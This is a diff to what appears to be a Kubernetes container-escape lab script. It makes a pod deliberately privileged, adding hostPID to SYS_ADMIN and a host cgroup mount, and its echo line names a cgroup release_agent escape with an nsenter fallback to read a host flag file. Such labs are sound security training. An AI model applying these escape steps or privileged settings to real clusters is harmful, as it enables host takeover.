@@ -16,6 +16,7 @@ kind: Pod
 metadata:
   name: capsys-pod
 spec:
+  hostPID: true
   containers:
     - name: escape
       image: alpine:latest
@@ -25,19 +26,13 @@ spec:
         capabilities:
           add: ["SYS_ADMIN"]
       volumeMounts:
-        - name: host-flag
-          mountPath: /host-flag
         - name: cgroup
           mountPath: /sys/fs/cgroup
   volumes:
-    - name: host-flag
-      hostPath:
-        path: /host-flag
-        type: Directory
     - name: cgroup
       hostPath:
         path: /sys/fs/cgroup
 YAML
 
 k8s_info
-echo "[+] Attack: mount cgroup → write release_agent → trigger escape → cat /host-flag/flag.txt"
+echo "[+] Attack: cgroup release_agent (v1) → cat /host-flag/flag.txt; fallback: nsenter --target 1 --mount"
